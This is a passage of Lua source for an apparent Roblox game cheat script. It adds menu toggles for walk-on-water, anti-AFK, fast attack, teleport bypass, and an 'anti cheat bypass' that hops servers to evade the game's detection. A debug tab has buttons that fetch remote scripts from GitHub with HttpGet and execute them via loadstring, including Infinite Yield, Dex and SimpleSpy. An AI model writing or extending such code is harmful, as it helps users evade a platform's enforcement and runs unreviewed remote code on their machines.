            humanoid:PlayEmote("Breakdance")
        end)
        
        getgenv().Settings["Distance X"] = 0
        getgenv().Settings["Distance Y"] = 30
        getgenv().Settings["Distance Z"] = 0

        local MiscTab = Window:NewTab("Misc")
        local MiscSection = MiscTab:NewSection("Misc")
        if getgenv().Settings["Walk On Water"] == nil then
            getgenv().Settings["Walk On Water"] = true
        end
        walkonwater = MiscSection:NewToggle("Walk On Water", "Walk On Water", function(state)
            getgenv().Settings["Walk On Water"] = state
            WriteSettings()
        end)
        if getgenv().Settings["Walk On Water"] then walkonwater:UpdateToggle(nil, true) end
        
        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().Settings["Walk On Water"] then
                        game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000,112,1000)
                    else
                        game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000,80,1000)
                    end
                end)
            end
        end)
        MiscSection:NewSlider("Distance X", "Min. Teammates for start", -30, 30, function(count)
            getgenv().Settings["Distance X"] = count
            WriteSettings()
        end)
        MiscSection:NewSlider("Distance Y", "Min. Teammates for start", -30, 30, function(count)
            getgenv().Settings["Distance Y"] = count
            WriteSettings()
        end)
        MiscSection:NewSlider("Distance Z", "Min. Teammates for start", -30, 30, function(count)
            getgenv().Settings["Distance Z"] = count
            WriteSettings()
        end)
        rd = MiscSection:NewToggle("Random Distance", "Random Distance", function(state)
            getgenv().Settings["Random Distance"] = state
            WriteSettings()
        end)
        if getgenv().Settings["Random Distance"] then rd:UpdateToggle(nil, true) end

        spawn(function()
            while task.wait() do
                pcall(function()
                    if getgenv().Settings["Random Distance"] then
                        getgenv().Settings["Distance X"] = math.random(-30,30)
                        if math.random(0,1) == 1 then
                            getgenv().Settings["Distance Y"] = math.random(20,35)
                        else
                            getgenv().Settings["Distance Y"] = math.random(-15,-23)
                        end
                        getgenv().Settings["Distance Z"] = math.random(-30,30)
                    end
                    task.wait(.1)
                end)
            end
        end)

        function OffsetCFrame()
            return CFrame.new(getgenv().Settings["Distance X"],getgenv().Settings["Distance Y"],getgenv().Settings["Distance Z"])
        end
         

        afk = MiscSection:NewToggle("Anti AFK", "Anti AFK", function(state)
            _G.AntiAFK = state
        end)
        afk:UpdateToggle(nil, true)
        
        anticheat = MiscSection:NewToggle("Bypass Anti Cheat", "Bypass Anti Cheat", function(state)
            _G.AntiCheat = state
        end)

        anticheat:UpdateToggle(nil, true)
        _G.AntiCheat = true

        if _G.TestNewBypass then
            rd:UpdateToggle(nil, true)
            anticheat:UpdateToggle(nil, false)
        end

        spawn(function()
            while wait(.1) do
                pcall(function()
                    if _G.AntiCheat then
                        if workspace.DistributedGameTime+0.5 > 1800 then
                            print("TRYING HOP")
                            HopServer()
                        end
                    end
                end)
            end
        end)

        fu = MiscSection:NewToggle("Fast Attack", "Fast Attack", function(state)
            _G.FastAttack = state
        end)
        fu:UpdateToggle(nil, true)
        fu = MiscSection:NewToggle("Fast Tween", "Fast Tween", function(state)
            _G.FastTween = state
        end)
        fu:UpdateToggle(nil, true)
        MiscSection:NewButton("Redeem All Codes", "Redeem All Codes", function()
                local redeem = function(code)
                    local args = {
                        [1] = code
                    }
                    ReplicatedStorage.Remotes.Redeem:InvokeServer(unpack(args))
                end
                redeem("SECRET_ADMIN")
                redeem("KITT_RESET")
                redeem("Sub2CaptainMaui")
                redeem("SUB2GAMERROBOT_RESET1")
                redeem("kittgaming")
                redeem("Sub2Fer999")
                redeem("Enyu_is_Pro")
                redeem("Magicbus")
                redeem("JCWK")
                redeem("Starcodeheo")
                redeem("Bluxxy")
                redeem("fudd10_v2")
                redeem("FUDD10")
                redeem("BIGNEWS")
                redeem("THEGREATACE")
                redeem("SUB2GAMERROBOT_EXP1")
                redeem("Sub2OfficialNoobie")
                redeem("StrawHatMaine")
                redeem("SUB2NOOBMASTER123")
                redeem("Sub2UncleKizaru")
                redeem("Sub2Daigrock")
                redeem("Axiore")
                redeem("TantaiGaming")               
                redeem("NEWTROLL")               
            end
        )
        local TeleportSettingsSection = MiscTab:NewSection("Teleport settings")
        MiscSection:NewToggle("Bypass Teleport", "Bypass Teleport", function(state)
            _G.UseBypassTP = state
        end)

        ServerSection:NewButton("Rejoin Server", "Rejoin Server", function()
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
        end)
        ServerSection:NewButton("Hop Server", "Hop Server", function()
            HopServer()
        end)
        ServerSection:NewLabel(" ")
        local lj = getgenv().Settings["lastjobid"] or " "
        local lastJobId = ServerSection:NewLabel("Last JobID: " .. lj)
        ServerSection:NewTextBox("Job ID", "Job ID", function(jobid)
            _G.JobID = jobid
        end)
        ServerSection:NewButton("Hop server to JobID", "TP to another server by JobID", function()
            getgenv().Settings["lastjobid"] = _G.JobID
            WriteSettings()
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, _G.JobID)
        end)
        ServerSection:NewButton("Hop to last JobID", "TP to another server by JobID", function()
            if getgenv().Settings["lastjobid"] then
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, getgenv().Settings["lastjobid"])
            end
        end)
        ServerSection:NewButton("Copy my JobID", "Copy to clipboard JobID", function()
            setclipboard(game.JobId)
        end)

        function findKeyCode(keyNum)
            for i,v in pairs(Enum.KeyCode:GetEnumItems()) do
                if v.Value == keyNum then
                    return v
                end
            end
            return Enum.KeyCode.RightShift
        end
        
        local uiTab = Window:NewTab("UI Settings")
        local uiSection = uiTab:NewSection("UI Settings")
        uiSection:NewKeybind("Show/Hide UI (Default: RShift)", "Shows and Hide UI", findKeyCode(getgenv().Settings["uibutton"]), function(key)
            Library:ToggleUI()
            _G.LastKey = key
        end)
        spawn(
            function()
                while wait() do
                    if _G.LastKey ~= nil and _G.LastKey.Value ~= getgenv().Settings["uibutton"] then
                        print("Changed to")
                        print(_G.LastKey)
                        print("=========")
                        getgenv().Settings["uibutton"] = _G.LastKey.Value
                        wait(1)
                        WriteSettings()
                    end
                    wait(2)
                end
            end
        )
        
        local debugTab = Window:NewTab("Debug Menu")
        local debugSection = debugTab:NewSection("Debug")
        debugSection:NewButton("Copy CFrame", "Copy to clipboard position", function()
            setclipboard(tostring(LP.Character.HumanoidRootPart.CFrame))
        end)
        debugSection:NewButton("Copy Vector3", "Copy to clipboard position", function()
            setclipboard("Vector3.new(" .. tostring(LP.Character.HumanoidRootPart.CFrame.Position) .. ")")
        end)
        debugSection:NewLabel(" ")
        debugSection:NewButton(
            "IY ADMIN",
            "IY ADMIN",
            function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
            end    
        )
        debugSection:NewButton(
            "CMD-X",
            "CMD-X",
            function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))()
            end    
        )
        debugSection:NewButton(
            "DEX",
            "dark dex",
            function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
            end    
        )
        debugSection:NewButton(
            "Simple Spy",
            "Simple Spy",
            function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua"))()
            end    
        )
        

        st, er = pcall(function()
            repeat wait()
                if LP.PlayerGui:WaitForChild("Main").ChooseTeam.Visible == true then
                    if _G.Team == "Pirate" then
                        for i, v in pairs(getconnections(LP.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Activated)) do                                                                                                
                            v.Function()
                        end
                    elseif _G.Team == "Marine" then
                        for i, v in pairs(getconnections(LP.PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.Activated)) do                                                                                                
                            v.Function()
                        end
                    else
                        if first_sea then
                            for i, v in pairs(getconnections(LP.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Activated)) do                                                                                                
                                v.Function()
                            end
                        else
                            for i, v in pairs(getconnections(LP.PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.Activated)) do                                                                                                
                                v.Function()
                            end
                        end
                            
                    end
                end
            until LP.Team ~= nil and game:IsLoaded() 
        end)
    end
end)
print(status, err)
